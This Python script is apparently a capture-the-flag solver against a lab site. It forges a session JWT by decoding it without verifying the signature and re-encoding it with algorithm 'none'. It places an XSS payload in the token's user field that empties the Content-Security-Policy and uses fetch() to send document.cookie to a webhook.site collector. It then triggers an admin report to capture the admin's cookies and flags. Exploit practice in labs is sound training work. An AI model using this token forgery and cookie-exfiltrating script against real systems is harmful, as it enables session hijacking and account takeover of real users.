import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

import jwt

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def main(self):
        URL = "https://meta.quoccacorp.com"

        response = self.session.get(URL)
        cookie_key_name = response.cookies.keys()[0] # Name: session

        original_jwt = response.cookies.get(cookie_key_name)

        jwt_payload_data = jwt.decode(original_jwt, options={"verify_signature": False})
        jwt_payload_data["user"] = f'''
        </title>
        <meta http-equiv="Content-Security-Policy" content="">
        <script>fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)</script>
        '''

        new_jwt = jwt.encode(jwt_payload_data, key="", algorithm="none")

        self.session.cookies.clear()
        self.session.cookies.set(cookie_key_name, new_jwt)

        # Report to Admin
        response = self.session.post(URL)
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()